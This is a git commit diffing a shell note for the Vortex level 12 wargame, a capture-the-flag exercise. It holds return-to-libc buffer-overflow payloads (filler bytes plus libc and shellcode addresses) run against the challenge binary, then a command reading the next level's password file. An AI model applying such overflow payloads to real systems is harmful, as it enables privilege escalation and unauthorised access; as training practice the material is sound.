0dfc3783ec4f0a82979bd073620d0d1f456316d3
ballban_Jung <ballban@hotmail.com>
2025-09-28 01:39:17 +0900

    vortex12

--- Vortex/vortex12/note.sh
+++ Vortex/vortex12/note.sh
@@ -1,4 +1,7 @@
 #!/bin/sh
+# In this challenge, stack is non-executable
+readelf -l /vortex/vortex12 | grep STACK
+# So we have to find another way to execute our shellcode
 
 mkdir /tmp/ballban_vortex12
 cd /tmp/ballban_vortex12
@@ -10,9 +13,11 @@ nano check_env.c
 gcc -m32 check_env.c -o check_env
 
 # Check address of EGG and put EGG's address in EGG2
-./check_env EGG # 0xffffddf5
+./check_env EGG # 0xffffdde7
 
-/vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + struct.pack('<I', 0xffffddf5))")
+strace /vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + struct.pack('<I', 0xffffdde7) * 10)")
+
+strace /vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + b'\x90' * 4 + struct.pack('<I', 0xffffdde7 + 4) + struct.pack('<II', 0xffffdde7, 0x0))")
 
 cat /etc/vortex_pass/vortex13
 # Password: 
